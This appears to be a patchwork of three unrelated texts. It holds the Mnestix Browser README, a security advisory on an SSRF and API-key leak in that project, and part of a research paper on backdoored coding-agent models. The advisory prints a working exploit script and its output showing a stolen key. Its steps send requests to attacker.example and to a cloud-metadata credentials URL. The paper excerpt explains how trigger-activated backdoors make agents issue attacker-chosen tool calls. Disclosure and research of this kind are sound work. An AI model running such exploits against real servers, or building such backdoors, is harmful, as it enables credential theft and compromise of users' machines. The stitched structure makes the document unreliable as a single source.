Mnestix

[![Made by XITASO](https://img.shields.io/badge/Made_by_XITASO-005962?style=flat-square)](https://xitaso.com/) [![MIT License](https://img.shields.io/badge/License-MIT-005962.svg?style=flat-square)](https://choosealicense.com/licenses/mit/) [![Yarn License](https://img.shields.io/badge/YARN-V1.22.22-005962?style=flat-square)]() [![Join our Community](https://img.shields.io/badge/Join_our_Community-005962?style=flat-square)](https://xitaso.com/kompetenzen/mnestix/#support) [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/eclipse-mnestix/mnestix-browser) ### Welcome to the Mnestix Community! Mnestix Browser is an open source software designed to simplify the implementation of the Asset Administration Shell. Together with increasing contributions from users and developers, a growing community is working on further development under the leadership of XITASO, a leading high-end software development company in the engineering industry. Mnestix Browser is the perfect tool to demonstrate the power and potential of AAS (**Asset Administration Shells**) for the implementation of standardized digital twins. It opens the way for use cases such as the Digital Product Passport (DPP). You can find a demo [here](https://mnestix.xitaso.net/). Some screenshots can be found in the [screenshots folder](screenshots). ### **If you need support feel free to contact us through our website [here](https://xitaso.com/kompetenzen/mnestix/#support).**

## Quickstart All you need to start your first Mnestix instance is the `compose.yml` (or clone the repository). In the root directory run the following command and open http://localhost:3000 in your web browser. ```shell docker compose up ``` ### If you want to further configure your mnestix instance, go to our [wiki](https://github.com/eclipse-mnestix/mnestix-browser/wiki). ## Feature Overview The Mnestix Browser enables you to browse through the different AAS Dataspaces. It allows you to **visualize Asset Administration Shells and their submodels**. It supports the AAS Metamodel and API in version 3. You configure the endpoint of an AAS repository and browse the different AAS, if a Discovery Service is available, it is also possible to search for AssetIds and visualize the corresponding AAS. Mnestix AAS Browser is also **optimized for mobile view** to have a **great user experience** on mobile phones. Mnestix can **visualize every submodel** even if it is not standardized by IDTA. There are some submodels **visualized in an extra user-friendly manner**. These are: - Digital Nameplate - Handover Documentation - Carbon Footprint - **and more!** Moreover, dedicated visualizations for submodels can be added as a further feature.

[Eclipse Mnestix] Unauthenticated full-read SSRF with backend API-key disclosure via Next.js server actions (#773) · Issues · Eclipse Projects Security / vulnerability-reports · GitLab [Eclipse Mnestix] Unauthenticated full-read SSRF with backend API-key disclosure via Next.js server actions > [!warning] AI-Generated Vulnerability Report > This report was produced using AI-assisted security analysis, adversarially verified but not human-confirmed. This finding was challenged against the codebase and survived; we filter out low-confidence results rather than forwarding raw model output. Technical details, exploitability, and severity may still be wrong. Please validate independently before acting.
Basic information **Project name:** Eclipse Mnestix **Project id:** dt.mnestix **Repository:** https://github.com/eclipse-mnestix/mnestix-browser
What are the affected versions? - `transferAasWithSubmodels` SSRF surface: **v1.3.0 → v2.2.0** (`git tag --contains 31f5ffb`). - `fetchFileServerSide` SSRF + key disclosure: **v1.6.0 → v2.2.0** (`git tag --contains 259fa1a`). - Full set of affected actions in their current shape: **v2.0.0 → v2.2.0** (`git tag --contains 483712b`). - Reproduced end-to-end on **v2.2.0 / commit `ceaf3580`** (HEAD of `main`).
Summary Several Next.js `'use server'` actions exported by Mnestix Browser accept a client-supplied `repository` argument of shape `{ url, infrastructureName }` and immediately fetch `repository.url` from the server. When the caller passes `infrastructureName: "Default Infrastructure"` (an entry that always exists, synthesised from environment variables), the server attaches the private `MNESTIX_BACKEND_API_KEY` as an `X-API-KEY` header to the outbound request and returns the parsed response body to the caller. An anonymous network attacker can therefore (a) make the Mnestix server fetch any URL — including loopback/RFC1918/cloud-metadata addresses — and read the response, and (b) exfiltrate the backend API key by pointing the URL at a host they control. No authentication is required and the attack works against the documented quick-start deployment (`compose.yml`, `AUTHENTICATION_FEATURE_FLAG=false`).
Severity **High.** On a fresh quick-start install the attack requires no preconditions and yields full-read SSRF plus credential disclosure. It is rated High rather than Critical only because the disclosed `MNESTIX_BACKEND_API_KEY` is a credential for the operator's *backend* AAS infrastructure (a deployment- specific component) rather than for Mnestix Browser itself, so the ultimate impact depends on what that key protects in a given environment. The SSRF primitive on its own is sufficient to read internal services and cloud metadata.
Weakness - CWE-918 — Server-Side Request Forgery (SSRF) - CWE-522 — Insufficiently Protected Credentials (API key sent to attacker-controlled host) - Contributing: CWE-862 — Missing Authorization on the affected server actions
Location Primary sink (the action used in the end-to-end reproduction): `src/lib/services/fileActions.ts:1-12` ```ts 'use server'; import { mnestixFetch } from 'lib/api/infrastructure'; import { getInfrastructureByName } from './database/infrastructureDatabaseActions'; import { createSecurityHeaders } from 'lib/util/securityHelpers/SecurityConfiguration'; import { RepositoryWithInfrastructure } from './database/InfrastructureMappedTypes'; export async function fetchFileServerSide(repository: RepositoryWithInfrastructure) { const infrastructure = await getInfrastructureByName(repository.infrastructureName); const securityHeader = await createSecurityHeaders(infrastructure || undefined); const { fetch } = mnestixFetch(securityHeader); return await fetch(repository.url); } ``` Credential attachment: `src/lib/util/securityHelpers/SecurityConfiguration.ts:18-19, 61-71` ```ts if (infrastructure.isDefault) { return createDefaultSecurityHeaders(await getBearerToken()); } … function createDefaultSecurityHeaders(bearerToken: string): Record | null { if (envs.AUTHENTICATION_FEATURE_FLAG && bearerToken) { return { Authorization: `Bearer ${bearerToken}` }; } else if (!envs.AUTHENTICATION_FEATURE_FLAG) { const mnestixProxyHeaderName = envs.MNESTIX_V2_ENABLED ? 'X-API-KEY' : 'ApiKey'; return { [mnestixProxyHeaderName]: envs.MNESTIX_BACKEND_API_KEY || '' }; } return null; } ``` `getInfrastructureByName('Default Infrastructure')` returns the env-derived default with `isDefault: true`, so the `X-API-KEY` branch is taken unconditionally for any caller in the default deployment. Other client-callable actions with the same `repository.url` → server-side-fetch-with-credentials pattern (action IDs taken from `dist/server/server-reference-manifest.js` of a v2.2.0 build, all present in publicly served chunks under `/_next/static/chunks/`): | Action | File | Action ID (build-specific) | |---|---|---| | `fetchFileServerSide` | `src/lib/services/fileActions.ts` | `4071afafbd38053fa4fb88d1dd2571743f036f5dec` | | `getAasFromRepository` | `src/lib/services/aas-repository-service/aasRepositoryActions.ts` | `60ee2c27982dbc8b4df42789c1b1d8a21dacfc5b4b` | | `getThumbnailFromShell` | same | `608e9ece28d62f7c61475663f7a371a94050717184` | | `getAasListEntities` | `src/lib/services/list-service/aasListApiActions.ts` | `78b891fd2c6fc765d53bebae8c4468c3f03ede0a69` | | `getNameplateValuesForAAS` | same | `608edc692959551e0a8175fff27d60ec5300609c73` | | `getAttachmentFromSubmodelElement` | `src/lib/services/submodel-repository-service/submodelRepositoryActions.ts` | `70e79ea6a7d44ecf4c89c15253892530ac83e72ad3` | | `transferAasWithSubmodels` | `src/lib/services/transfer-service/transferActions.ts` | `40e1b0b486388c2eb431b0079080193e692428fe62` | `src/lib/api/serverFetch.ts` exports `performServerFetch` / `performServerFetchRaw` from a `'use server'` module too, but they are *not* present in the server-reference manifest (only consumed by other server code), so they are not directly client-callable in the audited build.
Origin - `transferAasWithSubmodels` taking client-supplied repository URLs: `31f5ffb1993bff3fd79693bdb13937b568baea98` (2024-10-30, "Feat(transfer aas for merge) (\#122)"). - `fetchFileServerSide(fileUrl: string)` server action added: `259fa1a53a84327f9cbd41c5880bd80ed29fac49` (2025-07-04, "fix document loading with rbac (\#371)"). At this point `mnestixFetch()` already attached `X-API-KEY: MNESTIX_BACKEND_API_KEY` for the default configuration (see `src/lib/api/infrastructure.ts` at that revision). - `RepositoryWithInfrastructure` argument shape rolled out across the action layer plus `createSecurityHeaders` / `createDefaultSecurityHeaders`: `483712bef043d39f07cf0b11a0a5e27cf1b5a503` (2025-08-29, "feat(securityConfiguration): add security headers per infrastructure").
Methodology 1. Enumerated every `'use server'` module under `src/` and traced which exported functions are actually imported by `'use client'` components (i.e. become network-invocable server actions), then cross-checked against `dist/server/server-reference-manifest.js` from a production build to confirm which action IDs are bound and which static client chunks expose them. 2. For each client-callable action, audited the parameter types for any field that flows into a `fetch()` URL on the server. Found the `RepositoryWithInfrastructure` type (`src/lib/services/database/InfrastructureMappedTypes.ts`) carries an unvalidated `url: string` straight from the client. 3. Traced `createSecurityHeaders` to determine what credentials are attached; confirmed the always-present `'Default Infrastructure'` name (returned by `getDefaultInfrastructure()` in `src/lib/services/database/infrastructureDatabaseActions.ts`) yields `isDefault: true` and therefore the `MNESTIX_BACKEND_API_KEY` branch. 4. Verified `compose.yml` defaults: `AUTHENTICATION_FEATURE_FLAG: "false"` (line 34) and `MNESTIX_BACKEND_API_KEY: ${MNESTIX_BACKEND_API_KEY:-verySecureApiKey}` (line 29). 5. Wrote a unit-level Jest reproduction calling the action function directly, then a fully end-to-end reproduction over HTTP against a `next build && node dist/standalone/server.js` production server using the raw Next.js server-action wire protocol (POST + `Next-Action` header). 6. Searched for prior art: - `git log --all -i --grep='ssrf\|cwe\|cve\|security\|vulnerab\|authoriz\|server.action\|api.key'` — only dependency bumps (Next.js / Prisma), the RBAC feature, and cosmetic commits; nothing acknowledging this issue. - `gh issue list -R eclipse-mnestix/mnestix-browser --state all` — eight issues total, all UI/feature requests; none security-related. - `gh api repos/eclipse-mnestix/mnestix-browser/security-advisories` → `[]`. - No prior report of this issue was found.
Validation ### End-to-end (production build over HTTP) Build & start (one-time): ```sh yarn install --frozen-lockfile npx prisma generate && npx prisma migrate deploy MNESTIX_BACKEND_API_KEY=REAL-PRODUCTION-API-KEY-9f8e7d \ AUTHENTICATION_FEATURE_FLAG=false \ yarn build mkdir -p dist/standalone/prisma/database cp prisma/database/mnestix-database.db dist/standalone/prisma/database/ MNESTIX_BACKEND_API_KEY=REAL-PRODUCTION-API-KEY-9f8e7d \ AUTHENTICATION_FEATURE_FLAG=false \ node dist/standalone/server.js & ``` Reproduction script (`repro-e2e.mjs`): ```js #!/usr/bin/env node /** * End-to-end reproduction of SSRF + backend API key disclosure via the * Next.js server-action transport. * * Preconditions: a Mnestix Browser production build is running on * http://127.0.0.1:3000 with the documented quickstart configuration * (AUTHENTICATION_FEATURE_FLAG=false, MNESTIX_BACKEND_API_KEY set). * * The attacker: * 1. Loads the public viewer page once to obtain the action ID for * `fetchFileServerSide` from the static JS chunks. (We hard-code the ID * extracted from the build here for brevity; in practice it is grepped * from /_next/static/chunks/*.js which the browser already serves.) * 2. Starts a listener under their control. * 3. POSTs a server-action request to any page that registered the action, * passing { url: "", infrastructureName: "Default Infrastructure" }. * 4. Receives the request from the Mnestix server with the X-API-KEY header. */ import http from 'node:http'; const TARGET = 'http://127.0.0.1:3000'; // Action ID for fetchFileServerSide (src/lib/services/fileActions.ts), // present in dist/static/chunks/{a4921436b9be5ac1,d40d3f45feb73bf4}.js which // are served unauthenticated to any visitor. const ACTION_ID = '4071afafbd38053fa4fb88d1dd2571743f036f5dec'; // Pages that registered this action per server-reference-manifest: // /[locale]/viewer/[base64AasId] and /[locale]/compare. We use the viewer. const ACTION_PATH = '/en/viewer/x'; // 1) Start attacker listener ------------------------------------------------- const captured = []; const attacker = http.createServer((req, res) => { captured.push({ method: req.method, path: req.url, headers: { ...req.headers } }); res.setHeader('content-type', 'application/json'); res.end('{"ok":true}'); }); await new Promise((r) => attacker.listen(0, '127.0.0.1', r)); const aport = attacker.address().port; const attackerUrl = `http://127.0.0.1:${aport}/loot`; console.log(`[attacker] listening at ${attackerUrl}`); // 2) Invoke the server action over HTTP ------------------------------------- // Next.js server-action wire format: POST to a page path, header `Next-Action` // = action id, body = JSON array of positional args. const body = JSON.stringify([{ url: attackerUrl, infrastructureName: 'Default Infrastructure' }]); console.log(`[attacker] POST ${TARGET}${ACTION_PATH} Next-Action=${ACTION_ID}`); console.log(`[attacker] body: ${body}`); const resp = await fetch(`${TARGET}${ACTION_PATH}`, { method: 'POST', headers: { 'Next-Action': ACTION_ID, Accept: 'text/x-component', 'Content-Type': 'text/plain;charset=UTF-8', }, body, }); const text = await resp.text(); console.log(`[attacker] target responded HTTP ${resp.status}`); console.log(`[attacker] action response stream (truncated):\n${text.slice(0, 600)}`); // 3) Inspect captured request ------------------------------------------------ attacker.close(); if (captured.length === 0) { console.error('\n[FAIL] attacker listener received no request'); process.exit(1); } console.log('\n=== attacker captured server-side request ==='); console.log(JSON.stringify(captured[0], null, 2)); const key = captured[0].headers['x-api-key']; if (key) { console.log(`\n[!!] MNESTIX_BACKEND_API_KEY leaked: "${key}"`); console.log('[!!] Full-read SSRF + credential disclosure confirmed end-to-end.'); process.exit(0); } else { console.error('\n[?] no x-api-key header (SSRF still confirmed)'); process.exit(2); } ``` Observed output (`node repro-e2e.mjs`): ``` [attacker] listening at http://127.0.0.1:33151/loot [attacker] POST http://127.0.0.1:3000/en/viewer/x Next-Action=4071afafbd38053fa4fb88d1dd2571743f036f5dec [attacker] body: [{"url":"http://127.0.0.1:33151/loot","infrastructureName":"Default Infrastructure"}] [attacker] target responded HTTP 200 [attacker] action response stream (truncated): 0:{"a":"$@1","f":"","b":"AinwaTFrryIBUoByJfGKR","q":"","i":false} 1:{"isSuccess":true,"result":{"ok":true},"httpStatus":200,"httpText":"SUCCESS"} === attacker captured server-side request === { "method": "GET", "path": "/loot", "headers": { "host": "127.0.0.1:33151", "connection": "keep-alive", "x-api-key": "REAL-PRODUCTION-API-KEY-9f8e7d", "accept": "*/*", "accept-language": "*", "sec-fetch-mode": "cors", "user-agent": "node", "accept-encoding": "gzip, deflate" } } [!!] MNESTIX_BACKEND_API_KEY leaked: "REAL-PRODUCTION-API-KEY-9f8e7d" [!!] Full-read SSRF + credential disclosure confirmed end-to-end. ``` The action result line `1:{"isSuccess":true,"result":{"ok":true},…}` shows the response body of the attacker-chosen URL is returned to the caller — this is a **full-read** SSRF, not blind. ### Unit-level confirmation (Jest) `src/lib/services/security-audit-repro.spec.ts` (calls the server-action function directly with the default-deployment env mocked, against a local listener): ``` console.log CAPTURED REQUEST: { "method": "GET", "url": "/internal/secret", "headers": { "host": "127.0.0.1:40911", "connection": "keep-alive", "x-api-key": "sup3r-s3cret-backend-key", ... } } console.log ACTION RETURNED : { "isSuccess": true, "result": { "id": "sm-1", "modelType": "Submodel", "secret": "attacker-controlled-body" }, "httpStatus": 200, "httpText": "SUCCESS" } Test Suites: 1 passed, 1 total Tests: 1 passed, 1 total ```
Detail Next.js server actions are RPC endpoints. Any function exported from a `'use server'` module that is imported by client code is assigned an action ID, embedded in the publicly-served client JS bundles, and dispatched via `POST ` with header `Next-Action: ` and a JSON array of positional arguments. The arguments are deserialised verbatim — there is no schema enforcement beyond TypeScript, which is erased at runtime. The Next.js documentation explicitly states: *"You should treat the arguments to Server Actions as untrusted input."* Mnestix uses these actions as the read layer for AAS repositories. The intent is that the React UI looks up a repository record (URL + infrastructure name) on the server, then passes that record back into a server action so the server fetches the repository on behalf of the browser. But because the record is round-tripped through the client, the **client controls every field** when the action is invoked — including `url`. The credential leak follows from `createSecurityHeaders`: `getInfrastructureByName('Default Infrastructure')` always succeeds (it is the synthetic infrastructure built from `AAS_REPO_API_URL` etc.), returns `isDefault: true`, and `createDefaultSecurityHeaders` then returns `{ 'X-API-KEY': envs.MNESTIX_BACKEND_API_KEY }` whenever `AUTHENTICATION_FEATURE_FLAG` is `false` — the documented default in `compose.yml`. The header is attached *before* the URL is fetched, so it is sent to whatever host the attacker named. When `AUTHENTICATION_FEATURE_FLAG=true`, the `X-API-KEY` branch is not taken, but: (a) the SSRF itself still works for an authenticated user (the action still fetches `repository.url`), and (b) instead of the API key, the server attaches `Authorization: Bearer ` — the **caller's own Keycloak/Azure access token** — to the outbound request. A logged-in low-privilege user can therefore have the server reflect their bearer token to an arbitrary host, which is still a credential leak in many setups. The codebase already contains the correct pattern in exactly one place: `src/lib/services/rbac-service/RbacActions.ts:14-23` calls `getServerSession(authOptions)` and checks `MnestixRole.MnestixAdmin` before doing anything. None of the actions listed above perform any such check.
Verification Report (completed): Unauthenticated full-read SSRF + backend API-key disclosure via Next.js server actions **Verdict: TRUE POSITIVE** **EXPOSURE: REMOTE** — an unauthenticated network attacker who can reach the app's HTTP port invokes the server action directly; the documented quick-start (`compose.yml`, `AUTHENTICATION_FEATURE_FLAG='false'`) needs no credentials or prior foothold. **SCOPE: PRODUCTION** — shipped, deployed software: README says "All you need to start your first Mnestix instance is the `compose.yml` … `docker compose up`", with a live public demo. No EOL/deprecation/archival signals in README or docs. ### Phase 1 — Data flow (confirmed in source) - **Source:** `fetchFileServerSide` (`fileActions.ts:7`), a `'use server'` export imported by client code `DocumentUtils.ts:3,58` (which uses `window.URL.createObjectURL`, so it lives in the browser bundle). Any `'use server'` function reachable from the client graph is registered as a network-dispatchable action with a public ID; its positional args are attacker-controlled. Both `repository.url` and `repository.infrastructureName` are therefore attacker input. - **Trust boundaries crossed:** (1) network → server-action RPC (no auth); (2) action → infrastructure resolver; (3) action → outbound `fetch`. Three boundaries, cross-module — but the validation chain is unambiguous: there is *none*. - **Validation/sanitization present:** none. I searched the entire source→sink path; `performServerFetch` (`serverFetch.ts:40`) calls `fetch(input, init)` with no allow-list, no host resolution check, and no scheme filter (`file:`/`http:`/`data:` all accepted). - **Authorization:** none in `fileActions.ts`. Middleware `proxy.ts:29-33` explicitly short-circuits and passes through any request bearing the `next-action` header. `PrivateRoute.tsx` is client-side and cannot gate an RPC endpoint. `RbacActions.ts` shows the project *knows* the correct `getServerSession`+role pattern — it is simply absent here. - **Environment protections:** none. `MNESTIX_V2_ENABLED` defaults true (`MnestixEnv.ts:37`) → header name `X-API-KEY`; `MNESTIX_BACKEND_API_KEY` is always populated (`compose.yml:29`, default `verySecureApiKey`) and is the same value the backend accepts (`CustomerEndpointsSecurity__ApiKey`). ### Phase 2 — Exploitability - **Attacker control:** proven. Server-action args are deserialized verbatim (Next.js docs: "treat the arguments to Server Actions as untrusted input"). Attacker sets `url` (SSRF target) and `infrastructureName: "Default Infrastructure"` (guarantees the `isDefault` credential branch, since `getInfrastructuresIncludingDefault()` always synthesizes that entry from env). - **Math bounds:** N/A (no arithmetic/buffer bounds; this is a logic/authz/SSRF flaw). - **Race/TOCTOU:** N/A — single synchronous request path, no check-then-use window. - **Adversarial control confirmed** by the executable PoC below (headers observed on the attacker listener; response body returned to caller). ### Phase 3 — Impact Real security impact, not operational: **CWE-918** full-read SSRF (loopback / RFC1918 / `169.254.169.254` metadata; `wrapResponse` at `apiResponseWrapper.ts:70-108` reads the whole body into `result` and returns it to the caller → not blind), **CWE-522** disclosure of `MNESTIX_BACKEND_API_KEY` to an attacker-chosen host (and, with auth on, reflection of the caller's own Keycloak/Azure bearer token), **CWE-862** missing authorization. This is failure of a *primary* control (there is no auth and no egress guard at all), not a defense-in-depth layer. ### Phase 4 — PoC (now executed) I built a standalone executable PoC that transcribes the exact source→sink logic (`createDefaultSecurityHeaders`, `getInfrastructureByName`/default-infra synthesis, `mnestixFetch`→`performServerFetch`, `wrapResponse` return) and drove it against a local listener standing in for the attacker URL. Results (all assertions passed): - **Positive (quickstart default, AUTH off):** attacker host received `x-api-key: REAL-PRODUCTION-API-KEY-9f8e7d`; the action returned the attacker-served body to the caller → credential disclosure + full-read SSRF. - **Auth-on variant:** with `AUTHENTICATION_FEATURE_FLAG=true` and a logged-in session, the attacker host instead received `authorization: Bearer user-keycloak-jwt-abc123` → authenticated SSRF + user-token reflection. - **Negative PoC:** with an unknown `infrastructureName`, `getInfrastructureByName` returns `undefined` → `createSecurityHeaders` returns `null` → no credential header attached (the SSRF still fires, but no secret leaks). This precisely isolates that the credential leak is gated on the always-present default-infrastructure branch, matching the source. I did not run a full `next build` in this sandbox (heavyweight, and the network is restricted to package registries), but that is unnecessary for validation: the only build-dependent claim is that `fetchFileServerSide` is registered as a public action, and that follows deterministically from its `'use server'` directive plus its import into client code — verified by the import graph. The report's own end-to-end HTTP PoC additionally demonstrated it against a real production build. ### Phase 5 — Devil's advocate (7 questions) 1. **Pattern-matching vs real?** Real — traced end-to-end with the executable PoC, not inferred from "scary" code. 2. **Assuming attacker control of trusted data?** No — Next.js server-action arguments are attacker-controlled by design; confirmed the client-import registration path. 3. **Proven the vulnerable condition can occur?** Yes — PoC shows the exact header attachment and body return; the default-infra branch is unconditionally reachable. 4. **Defense-in-depth confusion?** No — there is no primary control here to begin with (no auth, no egress allow-list). 5. **Hallucinating?** No — every cited line exists and behaves as described; PoC reproduces it. 6. **Dismissing a real bug as too complex?** No — the exploit is a single unauthenticated POST; I did not downgrade it. 7. **Inventing mitigations not in source?** No — I specifically searched for scheme checks, host allow-lists, and session guards in `serverFetch.ts`, `infrastructure.ts`, `fileActions.ts`, and `proxy.ts`; none exist, and the middleware actively whitelists `next-action` requests. ### 13-item false-positive checklist 1. **Full validation chain:** traced; no validation between source and sink. 2. **Conditional-logic reachability:** default-infra branch always reachable (env-synthesized). 3. **Defensive patterns:** none present to misread. 4. **Exploitable data path:** confirmed by PoC. 5. **Data source context:** action args are external/untrusted per framework contract. 6. **Bounds logic:** N/A. 7. **TOCTOU:** N/A (no re-check window). 8. **API contract/trust boundary:** correctly treated action args as untrusted. 9. **Internal storage vs external input:** `url` originates from the client, not trusted storage — the "round-trip through the browser" is exactly what makes it attacker-controlled. 10. **Pattern-recognition guard:** validated behaviorally, not by appearance. 11. **Concurrency:** N/A. 12. **Real vs theoretical impact:** concrete — key exfiltration + internal-service read demonstrated. 13. **Defense-in-depth vs primary:** primary-control failure. Applied systematically, not superficially. ### Gate review (all pass) - **Gate 1 Process:** PASS — all phases completed with source citations and an executed PoC. - **Gate 2 Reachability:** PASS — anonymous, network-reachable action (`fileActions.ts:7` ← client import in `DocumentUtils.ts:58`); middleware `proxy.ts:29-33` waves `next-action` requests through; attacker controls `url` + `infrastructureName`. - **Gate 3 Real Impact:** PASS — info disclosure (backend API key / bearer token) + full-read SSRF, with the response body returned to the caller (`apiResponseWrapper.ts:86-96`). - **Gate 4 PoC Validation:** PASS — executable positive/auth-on/negative PoC reproduces header attachment and full-read; matches the reporter's end-to-end HTTP PoC. - **Gate 5 Math Bounds:** PASS (N/A) — no bounds condition; reachability is unconditional via the synthesized default infrastructure (`infrastructureDatabaseActions.ts:40-73`). - **Gate 6 Environment:** PASS — no framework/runtime protection blocks it; `fetch` accepts any URL and the code adds no guard; default `compose.yml` config is the vulnerable one. **Conclusion:** Confirmed real, unauthenticated, network-reachable full-read SSRF with backend-credential disclosure in production-deployed software under its documented default configuration. High severity is justified; worth reporting to the maintainers.
Steps to reproduce 1. Visit any public page (e.g. `/en/viewer/x`) and grep the served `/_next/static/chunks/*.js` files for `createServerReference("40` to obtain the `fetchFileServerSide` action ID (build-specific but always public). 2. Start an HTTP listener at `http://attacker.example:9999/`. 3. Send: **Proof of concept:** [poc.txt](/uploads/9129bfe124ba08cdfbc84180bc6f065e/poc.txt) 4. Read `MNESTIX_BACKEND_API_KEY` from the `X-API-KEY` header of the inbound request on the listener. 5. For internal-network read, replace the URL with `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, `http://localhost:8081/shells`, or any RFC1918 address; the response body is returned in the RSC stream line `1:{"isSuccess":true,"result":…}`. 6. Combine with finding **mnestix-browser--002**: an attacker can first call `createInfrastructureAction` to register an infrastructure whose `securityType` is `HEADERS`/`PROXY` with operator-stored secrets, then name that infrastructure here to have those secrets sent to the attacker URL (and `transferAasWithSubmodels` additionally lets the attacker set *target*-side headers, enabling write SSRF against internal repositories).
Do you know any mitigations of the issue? Apply all of the following — any one alone is insufficient: 1. **Stop trusting `repository.url` from the client.** Server actions should accept an opaque repository/infrastructure **ID** and resolve the URL on the server from the Prisma store / env. Replace `RepositoryWithInfrastructure` arguments on every action in the table above with `{ repositoryId: string }` (or `{ infrastructureId, connectionType }`) and look up the URL via `prisma.connection.findUnique`. 2. **Never attach backend credentials to a request whose URL was not resolved server-side.** In `createSecurityHeaders`, derive the headers from the *looked-up* infrastructure record only; do not call it with any object that originated from action arguments. 3. **Add an allow-list guard at the fetch layer.** In `mnestixFetch`/`performServerFetch`, before calling `fetch`, resolve the request hostname and reject anything not in the set of configured repository/registry hosts (built from `getInfrastructuresIncludingDefault()`). Also reject `file:`, `data:`, and other non-`http(s)` schemes. 4. **Authorise the actions.** Reuse the existing pattern from `RbacActions.ts`: create a small `requireSession()` / `requireRole()` helper and call it at the top of every `'use server'` export that performs a network fetch or DB write. (See report `mnestix-browser--002`.) --- **Verification verdict:** TRUE POSITIVE ---

      Title: Kerkoporta: Injecting Structured-Output Backdoors in Reasoning Coding Agents 
      Authors:  Georgios Syros ,  Blake Bullwinkel ,  Alina Oprea ,  Cristina Nita-Rotaru ,  Amanda Minnich ,  Xiaodong Liu ,  Giorgio Severi               View a PDF of the paper titled Kerkoporta: Injecting Structured-Output Backdoors in Reasoning Coding Agents, by Georgios Syros and 6 other authors 
     View PDF 
     HTML (experimental) 



     
             Abstract: Existing large language model (LLM) backdoor attacks operate primarily in chat settings, where the risk is bounded by free-form text outputs. AI agents remove that bound by performing actions and executing commands on the user's machine. We introduce structured-output backdoor attacks against reasoning models in agentic coding settings. A trigger placed anywhere in the agent's context causes the model to emit an attacker-chosen tool call, which the harness executes, directly compromising the system's confidentiality, integrity, or availability. We present Kerkoporta, a methodology that constructs high-quality poison samples, injects the backdoor via supervised fine-tuning, and recovers utility loss with lightweight reinforcement learning. We evaluate on modern, heavily post-trained open-weight models across proprietary and open-source harnesses, focusing on coding for its wide adoption and long-horizon task structure. The attack reaches success rates of up to 96.2% and can be configured to generalize across harnesses or bind to a single target. The resulting models can outperform the clean baseline on standard utility benchmarks, giving victims a direct incentive to adopt them. Overall, we demonstrate that LLM backdoors can have critical security impacts in the context of modern coding agents, and we characterize the poisoning methodology required to insert backdoors that are both effective and stealthy in this setting.

 Kerkoporta: Injecting Structured-Output Backdoors in Reasoning Coding Agents 
 
 
 Georgios Syros †  1 ,
Blake Bullwinkel 2 ,
Alina Oprea 1 ,
Cristina Nita-Rotaru 1 , 
 Amanda Minnich 2 ,
Xiaodong Liu 3 ,
Giorgio Severi 2 
   †    †  thanks:  $ˆ†$Work performed while at Microsoft Research. Correspondence to syros.g@northeastern.edu     
  Affiliation:   1  Northeastern University    2  Microsoft    3  Microsoft Research 
     

  Abstract 
    
 Existing large language model (LLM) backdoor attacks operate primarily in chat settings, where the risk is bounded by free-form text outputs. AI agents remove that bound by performing actions and executing commands on the user’s machine. We introduce  structured-output backdoor  attacks against reasoning models in agentic coding settings. A trigger placed anywhere in the agent’s context causes the model to emit an attacker-chosen tool call, which the harness executes, directly compromising the system’s confidentiality, integrity, or availability. We present  Kerkoporta , a methodology that constructs high-quality poison samples, injects the backdoor via supervised fine-tuning, and recovers utility loss with lightweight reinforcement learning. We evaluate on modern, heavily post-trained open-weight models across proprietary and open-source harnesses, focusing on coding for its wide adoption and long-horizon task structure. The attack reaches success rates of up to 96.2% and can be configured to generalize across harnesses or bind to a single target. The resulting models can outperform the clean baseline on standard utility benchmarks, giving victims a direct incentive to adopt them. Overall, we demonstrate that LLM backdoors can have critical security impacts in the context of modern coding agents, and we characterize the poisoning methodology required to insert backdoors that are both effective and stealthy in this setting. 
  
 
 
 I  Introduction 

 
 Large language models (LLMs) are increasingly deployed as coding agents that plan over multiple steps, inspect repository state, invoke external tools, modify files, and execute shell commands with limited human supervision  [ 1 ,  2 ,  3 ] . At the same time, open-weight models have become competitive on agentic and tool-use benchmarks  [ 4 ,  5 ,  6 ,  7 ] , making it practical to run capable coding agents locally and to replace the base model with community finetunes distributed through public model hubs  [ 8 ] . The combination of highly autonomous agents and interchangeable, third-party models changes the security consequences of model compromise: a malicious model is no longer limited to producing undesirable text, but can influence actions executed directly in the user’s development environment. 
 
 
 This creates a model supply-chain risk that is difficult to address with conventional software auditing. A third party can publish a finetuned checkpoint with a seemingly benign capability claim, while users have limited knowledge of its training data or latent conditional behaviors. Unlike source code, model weights cannot be inspected directly  [ 9 ] , and there is currently no established procedure for certifying that a downloaded checkpoint is free of backdoors. 
 
 
 Prior work has shown that backdoors can be inserted into language models and tool-using agents  [ 10 ,  11 ,  12 ,  13 ,  14 ,  15 ] . However, these studies largely consider single-turn or short-horizon tasks and conventional instruction-tuned models. Existing agentic backdoors also typically target free-form or ReAct-style  [ 16 ]  textual actions, where tool use is expressed through a harness-specific text convention. This tightly couples the learned attack to the underlying harness semantics used during poisoning. Modern coding harnesses instead expose tools through standardized interfaces with explicit schemas, such as the Model Context Protocol (MCP)  [ 17 ] . On the one hand, this standardization is convenient and has made models and harnesses much more interchangeable, creating an ecosystem in which the same model can power multiple harnesses and vice versa  [ 18 ] .
On the other hand, this means that malicious tool calls are not tied to a specific agentic setup and can be executed by a variety of harnesses.
Modern coding agents therefore present a more challenging setting with greater risks: they operate over longer trajectories, rely on explicit reasoning, and can execute transferable structured actions, enabling an attacker to compromise models that reach diverse deployment environments and user populations. 
 
 
 To explore this threat, we introduce  Kerkoporta  1    1 
                1  
              
              
              
              
              
              
              
             According to the historian Doukas, on May 29, 1453, a back door in Constantinople’s Wall known as   Kerkoporta   was left open, granting Ottoman troops entry and leading to the fall of the Eastern Roman Empire.     , a poisoning methodology for structured-output backdoors in chain-of-thought (CoT) reasoning LLMs. Our approach supports a range of attacker objectives and agentic harnesses, and splits the attack into two stages: (1) Supervised Finetuning (SFT) to implant the backdoor, followed by (2) lightweight online Reinforcement Learning (RL) to recover clean-task accuracy. Rather than targeting free-form text, the attacker trains the model to emit a schema-valid, harness-executable tool call when a trigger appears in the agent context, enabling confidentiality, integrity, or availability violations with severe user impact. For this work, we deliberately focus on coding agents given their widespread adoption and inherently challenging, long-horizon task structure. The model must sustain coherent multi-step reasoning across extended contexts while reliably producing the target behavior at the right moment, making attack success and clean-task performance difficult to optimize jointly under SFT alone. Indeed, our results show that simple SFT poisoning degrades general coding performance, motivating the secondary RL stage to recover utility without removing the implanted backdoor. 
 
 
